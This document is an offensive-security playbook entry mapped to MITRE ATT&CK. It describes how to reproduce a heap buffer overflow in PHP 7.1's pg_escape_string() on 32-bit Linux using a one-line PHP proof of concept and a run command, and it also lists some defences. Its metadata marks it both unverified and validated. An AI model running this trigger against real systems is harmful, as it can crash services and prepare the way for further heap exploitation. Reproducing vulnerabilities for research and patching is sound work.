---
id: proc-trigger-php-overflow
tags:
  - php
  - heap-overflow
  - reproduction
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/php-trigger-pg-escape-overflow]]'
verified: false
platforms:
  - Linux
  - 32-bit
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:28:20.134Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Trigger-Heap-Overflow-with-PHP-Test-Script

## Summary

This procedure creates and executes a PHP script to trigger the integer overflow and resulting heap buffer overflow in pg_escape_string() by using a maximally long input string.

## Description

Targeted at vulnerable PHP 7.1 on 32-bit Linux, the script sets unlimited memory, generates a string of PHP_INT_MAX 'a's, and calls pg_escape_string(), causing allocation of only 0x10 bytes while attempting to write massive data, leading to heap corruption observable via crash or debugger.

## Requirements

1. Vulnerable PHP 7.1 installation with PostgreSQL extension
2. 32-bit Linux environment
3. Write access to create and execute PHP files

## Defense

Defensive measures and detection strategies:

- Input length validation in PHP applications using pg_escape_string()
- Use prepared statements instead of string escaping
- Monitor for PHP crashes or high memory usage in logs

## Objectives

1. Reproduce the overflow without debugging
2. Confirm crash due to small buffer/large write
3. Prepare for further exploitation

## Instructions

### Step 1: Create Test Script

**Context**: Write the PHP script to generate large input.

Use [[commands/php-trigger-pg-escape-overflow]] to create and run:

```php
<?php ini_set('memory_limit',-1); $s=str_repeat("a",0x7FFFFFFF); $escaped=pg_escape_string($s); ?>
```

> Sets memory limit to unlimited, creates string of 0x7FFFFFFF 'a's, calls pg_escape_string() triggering overflow.

### Step 2: Execute Script

**Context**: Run the script to observe initial crash.

Execute with PHP:

```bash
php test_overflow.php
```

> Expect SIGSEGV or heap corruption; no output if crashed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/php-trigger-pg-escape-overflow]]

## Tools Used

- [[tools/PHP]]

## Tags

- php
- heap-overflow
- reproduction
